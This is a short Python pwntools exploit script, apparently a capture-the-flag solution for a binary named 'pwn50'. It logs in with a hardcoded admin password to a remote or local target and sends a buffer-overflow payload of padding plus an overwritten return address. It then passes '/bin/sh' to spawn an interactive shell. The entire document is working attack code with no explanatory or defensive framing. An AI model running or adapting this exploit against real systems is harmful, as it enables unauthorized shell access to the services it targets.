from pwn import *


def login(target):
	target.recvuntil('username: ')
	target.sendline('admin')
	target.recvuntil('password: ')
	target.sendline('T6OBSh2i')

def debug(flag):
	if flag == 0:
		target = remote('192.168.11.21',9999)
		return target
	else:
		target = process('/home/star/Desktop/pwn50')
		return target

def exploit(target):
	target.recvuntil('Your choice: ')
	payload = ''
	payload = '1' + 'A' * 79 + p64(1) + p64(0x40084A)
	target.sendline(payload)
	target.recvuntil('Command: ')
	target.sendline('/bin/sh\x00')
	target.recvuntil('Your choice: ')
	target.sendline('3')
	target.interactive()

def main():
	target = debug(0)
	login(target)
	log.success('login success')
	exploit(target)

if __name__ == '__main__':
	main()